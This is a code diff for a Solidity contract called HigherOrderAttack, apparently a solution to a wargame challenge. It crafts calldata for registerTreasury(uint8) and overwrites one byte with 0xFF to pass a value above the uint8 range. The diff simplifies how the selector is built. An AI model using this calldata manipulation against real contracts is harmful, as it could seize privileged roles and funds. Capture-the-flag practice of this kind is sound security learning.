@@ -1,16 +1,12 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.7.6;
 
-import "./HigherOrder.sol";
-
 contract HigherOrderAttack {
-  HigherOrder public order;
-
-  function encodedData() public view returns (bytes memory) {
-    return abi.encodeWithSelector(order.registerTreasury.selector, uint8(42));
+  function encodedData() public pure returns (bytes memory) {
+    return abi.encodeWithSignature("registerTreasury(uint8)", uint8(42));
   }
 
-  function injectedData() public view returns (bytes memory) {
+  function injectedData() public pure returns (bytes memory) {
     bytes memory data = encodedData();
     data[21] = hex"FF";
     return data;
